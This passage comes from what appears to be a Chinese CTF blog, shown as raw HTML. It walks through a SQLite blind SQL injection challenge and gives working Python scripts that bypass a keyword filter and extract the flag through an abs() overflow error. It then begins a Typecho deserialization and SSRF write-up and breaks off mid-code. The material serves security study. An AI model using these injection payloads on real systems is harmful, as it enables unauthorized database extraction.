class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;match&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;in&#x27;</span>, <span class="string">&#x27;limit&#x27;</span>, <span class="string">&#x27;order&#x27;</span>, <span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;join&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="variable">$regexp</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/json; charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check user input</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;You must specify vote id&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!is_valid(<span class="variable">$id</span>)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Vote id contains dangerous chars&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// update database</span></span><br><span class="line"><span class="variable">$pdo</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;sqlite:../db/vote.db&#x27;</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$pdo</span>-&gt;query(<span class="string">&quot;UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$res</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;An error occurred while updating database&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// succeeded!</span></span><br><span class="line"><span class="keyword">echo</span> json_encode([</span><br><span class="line">  <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Thank you for your vote! The result will be published after the CTF finished.&#x27;</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
<p>分析源代码，发现过滤了很多sql关键字，从<code>$pdo = new PDO(&#39;sqlite:../db/vote.db&#39;);</code>,还知道了这是sqllite 的数据库，且由于过滤了” ‘所以无法判断是字符型还是整形，</p>
<p>关键点在</p>
<blockquote>
<p>$res = $pdo-&gt;query(“UPDATE vote SET count = count + 1 WHERE id = ${id}”);</p>
</blockquote>
<p><code>UPDATE</code> 成功与失败分别对应了不同的页面，那么是不是可以进行盲注，但是考虑到它过滤了 <code>&#39;</code> 和 <code>&quot;</code> 这就无法使用字符进行判断，<code>char</code> 又被过滤也无法使用 ASCII 码判断</p>
<p>这里考虑使用 <code>hex</code> 进行字符判断，将所有的的字符串组合用有限的 36 个字符表示</p>
<p><strong>1. 先考虑对 flag 16 进制长度的判断，假设它的长度为 <code>x</code>，<code>y</code> 表示 2 的 n 次方，那么 <code>x&amp;y</code> 就能表现出 <code>x</code> 二进制所有为 1 的位置，将这些 <code>y</code> 再进行或运算就可以得到完整的 <code>x</code> 的二进制，也就得到了 flag 的长度，而 <code>1&lt;&lt;n</code> 恰可以表示 2 的 n 次方</strong></p>
<p>解释下上面这段话的意思：</p>
<blockquote>
<p>&lt;&lt;   左移   用来将一个数的各二进制位全部左移N位，高位舍弃，低位补0</p>
<p>1&lt;&lt;n ，为二进制，但转化为十进制之后就是以2的倍数递增</p>
</blockquote>
<p><img src="https://img.npfs06.top/20210311173033.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<blockquote>
<p>&amp;  按位与   对两个整数值执行“位与”运算.它会将第一个操作数的每一位与第二个操作数中对应的每一位进行比较.如果两位都是 1,则相应的结果位设置为 1.否则,相应的结果位设置为 0</p>
</blockquote>
<p>两个十进制按位与会先将其转化为二进制，进行按位与后再转回十进制</p>
<p><code>x&amp;y</code>所做的其实就是遍历x中的每一位，举个例子</p>
<blockquote>
<p>x: 01000100</p>
<p>y: 00000001    //这个时候 x&amp;y的值为0</p>
<p>y: 00000010    //这个时候 x&amp;y的值为0</p>
<p>y: 00000100    /这个时候 x&amp;y的值不为0 ，这也就说明了x的第2位为1</p>
<p>……</p>
<p>遍历之后，将所有x&amp;y不为0时的y值进行或运算，也就可以得出x的二进制了</p>
</blockquote>
<p><img src="http://img.npfs06.top/20210311224630.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>那么如何构造报错语句呢？在 <code>sqlite3</code> 中，<code>abs</code> 函数有一个整数溢出的报错，如果 <code>abs</code> 的参数是 <code>-9223372036854775808</code> 就会报错，同样如果是正数也会报错</p>
<p>判断长度的 payload :</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">abs</span>(<span class="title">case</span>(<span class="title"><span class="built_in">length</span></span>(<span class="title">hex</span>((<span class="title">select</span>(<span class="variable">flag</span>)<span class="title">from</span>(<span class="variable">flag</span>))))&amp;&#123;<span class="number">1</span>&lt;&lt;<span class="variable">n</span>&#125;)<span class="title">when</span>(<span class="number">0</span>)<span class="title">then</span>(<span class="number">0</span>)<span class="title">else</span>(<span class="number">0</span><span class="variable">x8000000000000000</span>)<span class="variable">end</span>)</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://7d124b25-63ec-4b08-b8fe-7b3c6f6913fe.node3.buuoj.cn/vote.php&quot;</span></span><br><span class="line">l = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    payload = <span class="string">f&#x27;abs(case(length(hex((select(flag)from(flag))))&amp;<span class="subst">&#123;<span class="number">1</span> &lt;&lt; n&#125;</span>)when(0)then(0)else(0x8000000000000000)end)&#x27;</span></span><br><span class="line">    print(payload)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;id&#x27;</span>: payload</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = requests.post(url=url, data=data)</span><br><span class="line">    print(r.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;occurred&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        l = l | <span class="number">1</span> &lt;&lt; n</span><br><span class="line"></span><br><span class="line">print(l)</span><br></pre></td></tr></table></figure>
<p>运行脚本，我们可以得到flag长度为84</p>
<p>接下去要做的就是逐字符进行判断，但是 <code>is_valid()</code> 过滤了大部分截取字符的函数，而且也无法用 ASCII 码判断</p>
<p>这一题对盲注语句的构造很巧妙，首先利用如下语句分别构造出 <code>ABCDEF</code> ，这样十六进制的所有字符都可以使用了，并且使用 <code>trim(0,0)</code> 来表示空字符</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 除去 12567 就是 A ，其余同理</span></span><br><span class="line">A = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)&#x27;</span></span><br><span class="line"></span><br><span class="line">C = <span class="string">&#x27;trim(hex(typeof(.1)),12567)&#x27;</span></span><br><span class="line"></span><br><span class="line">D = <span class="string">&#x27;trim(hex(0xffffffffffffffff),123)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hex(0.1) = 302E31</span></span><br><span class="line"><span class="comment"># 除去 1230 就是 E</span></span><br><span class="line">E = <span class="string">&#x27;trim(hex(0.1),1230)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hex(b&#x27;dog&#x27;) = 646F67</span></span><br><span class="line"><span class="comment"># 除去 467 就是 F</span></span><br><span class="line">F = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hex(b&#x27;koala&#x27;) = 6B6F616C61</span></span><br><span class="line"><span class="comment"># 除去 16CF 就是 B</span></span><br><span class="line">B = f<span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||&#123;C&#125;||&#123;F&#125;)&#x27;</span></span><br></pre></td></tr></table></figure>


<ul>
<li>然后逐字符进行爆破，已经知道 flag 格式为 <code>flag&#123;&#125;</code> ，<code>hex(b&#39;flag&#123;&#39;)==666C61677B</code> ，在其后面逐位添加十六进制字符，构成 paylaod</li>
<li>再利用 <code>replace(length(replace(flag,payload,&#39;&#39;))),84,&#39;&#39;)</code> 这个语句进行判断</li>
<li>如果 flag 不包含 payload ，那么得到的 <code>length</code> 必为 84 ，最外面的 <code>replace</code> 将返回 <code>false</code> ，通过 <code>case when then else</code> 构造 <code>abs</code> 参数为 <code>0</code> ，它不报错</li>
<li>如果 flag 包含 payload ，那么 <code>replace(flag, payload, &#39;&#39;)</code> 将 flag 中的 payload 替换为空，得到的 <code>length</code> 必不为 84 ，最外面的 <code>replace</code> 将返回 <code>true</code> ，通过 <code>case when then else</code> 构造 <code>abs</code> 参数为 <code>0x8000000000000000</code> 令其报错</li>
<li>以上就可以根据报错爆破出 flag，最后附上出题人脚本</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">URL = <span class="string">&#x27;http://9bc57f7c-3543-4dac-9a39-b0d6fe93990f.node3.buuoj.cn/vote.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">l = <span class="number">84</span></span><br><span class="line"></span><br><span class="line">header=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table = &#123;&#125;</span><br><span class="line">table[<span class="string">&#x27;A&#x27;</span>] = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;C&#x27;</span>] = <span class="string">&#x27;trim(hex(typeof(.1)),12567)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;D&#x27;</span>] = <span class="string">&#x27;trim(hex(0xffffffffffffffff),123)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;E&#x27;</span>] = <span class="string">&#x27;trim(hex(0.1),1230)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;F&#x27;</span>] = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;B&#x27;</span>] = <span class="string">f&#x27;trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="subst">&#123;table[<span class="string">&quot;C&quot;</span>]&#125;</span>||<span class="subst">&#123;table[<span class="string">&quot;F&quot;</span>]&#125;</span>)&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = binascii.hexlify(<span class="string">b&#x27;flag&#123;&#x27;</span>).decode().upper()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res), l):</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;0123456789ABCDEF&#x27;</span>:</span><br><span class="line">    t = <span class="string">&#x27;||&#x27;</span>.join(c <span class="keyword">if</span> c <span class="keyword">in</span> <span class="string">&#x27;0123456789&#x27;</span> <span class="keyword">else</span> table[c] <span class="keyword">for</span> c <span class="keyword">in</span> res + x)</span><br><span class="line">    r = requests.post(URL, data=&#123;</span><br><span class="line">      <span class="string">&#x27;id&#x27;</span>: <span class="string">f&#x27;abs(case(replace(length(replace(hex((select(flag)from(flag))),<span class="subst">&#123;t&#125;</span>,trim(0,0))),<span class="subst">&#123;l&#125;</span>,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)&#x27;</span></span><br><span class="line">    &#125;,headers=header)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;An error occurred&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">      res += x</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    time.sleep(<span class="number">0.06</span>)</span><br><span class="line">  <span class="comment"># print(f&#x27;[+] flag (&#123;i&#125;/&#123;l&#125;): &#123;res&#125;&#x27;)</span></span><br><span class="line">  print(<span class="string">&#x27;flag(hex): &#x27;</span>,res)</span><br><span class="line">  i += <span class="number">1</span></span><br><span class="line"><span class="comment"># print(&#x27;[+] flag:&#x27;, binascii.unhexlify(res).decode())</span></span><br><span class="line">print(binascii.unhexlify(res).decode())</span><br></pre></td></tr></table></figure>




<h2 id="MRCTF2020-Ezpop-Revenge"><a href="#MRCTF2020-Ezpop-Revenge" class="headerlink" title="[MRCTF2020]Ezpop_Revenge"></a>[MRCTF2020]Ezpop_Revenge</h2><p><strong>知识点：</strong></p>
<ol>
<li><strong>代码审计</strong></li>
<li><strong>SOAP 反序列化</strong></li>
<li><strong>SSRF</strong></li>
<li><strong>CRLF</strong></li>
</ol>
<p>题目打开是个 typecho 博客，<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 泄露，下载得到源码。全局搜了一下<code>flag</code>，搜到了两个有用的东西，一个假flag，另一个是flag.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>)) session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">   <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>]= <span class="string">&quot;MRCTF&#123;******&#125;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;我扌your problem?\nonly localhost can get flag!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>暗示这是一个 SSRF 题</p>
<p>因为是 POP 链问题，先找反序列化位点,全局搜索：unserialize</p>
<p>跟进到Plugin.php,代码比较多，简化一下，这个 Plugin.php 中的核心代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>=<span class="string">&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$coincidence</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$db</span> = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;hello&#x27;</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;world&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_Plugin</span> <span class="keyword">implements</span> <span class="title">Typecho_Plugin_Interface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>)) session_start();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;admin&#x27;</span>])) var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;C0incid3nc3&#x27;</span>])) &#123;</span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">&quot;/file|assert|eval|[`\&#x27;~^?&lt;&gt;$%]+/i&quot;</span>,base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;C0incid3nc3&#x27;</span>])) === <span class="number">0</span>)</span><br><span class="line">				unserialize(base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;C0incid3nc3&#x27;</span>]));</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;Not that easy.&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，<code>HelloWorld_DB</code>中的<code>__wakeup</code>实例化了一个<code>Typecho_Db</code>，传给构造方法的参数是 <code>$this-&gt;coincidence</code> 数组的两个键值；下面这个类在没有设置session时会开启session，接受到<code>admin</code>参数时会输出session，并过滤了<code>C0incid3nc3</code>参数的一些RCE及特殊字符，过滤成功则反序列化<code>C0incid3nc3</code>，也需要跟进一下<code>action</code>函数<br>先跟进一下<code>Typecho_Db</code>，在var\Typecho\Db.php，此脚本核心代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$adapterName</span>, <span class="variable">$prefix</span> = <span class="string">&#x27;typecho_&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapterName = <span class="variable">$adapterName</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** 数据库适配器 */</span></span><br><span class="line">        <span class="variable">$adapterName</span> = <span class="string">&#x27;Typecho_Db_Adapter_&#x27;</span> . <span class="variable">$adapterName</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>(<span class="variable">$adapterName</span>, <span class="string">&#x27;isAvailable&#x27;</span>))) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">&quot;Adapter <span class="subst">&#123;$adapterName&#125;</span> is not available&quot;</span>);<span class="comment">//__toString()</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_prefix = <span class="variable">$prefix</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化适配器对象</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> <span class="variable">$adapterName</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第九行，字符串拼接<code>__wakeup</code>实例化的<code>coincidence[&#39;hello&#39;]</code>，我们知道当类被当成字符串拼接时，那就会调用某个类的<code>__toString</code>，而这里恰好<code>$adapterName</code>可控，再搜<code>__toString()</code>，找到<code>var\Typecho\Db\Query.php</code>中定义了一大段，核心如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$_default</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;action&#x27;</span> =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;table&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;fields&#x27;</span> =&gt; <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;join&#x27;</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">        <span class="string">&#x27;where&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;limit&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;offset&#x27;</span> =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;order&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;group&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;having&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;rows&#x27;</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sqlPreBuild</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::SELECT:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::INSERT:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;INSERT INTO &#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="string">&#x27;(&#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, array_keys(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">                . <span class="string">&#x27; VALUES &#x27;</span></span><br><span class="line">                . <span class="string">&#x27;(&#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, array_values(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;limit&#x27;</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::DELETE:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;DELETE FROM &#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::UPDATE:</span><br><span class="line">                <span class="variable">$columns</span> = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">                        <span class="variable">$columns</span>[] = <span class="string">&quot;<span class="subst">$key</span> = <span class="subst">$val</span>&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;UPDATE &#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="string">&#x27; SET &#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, <span 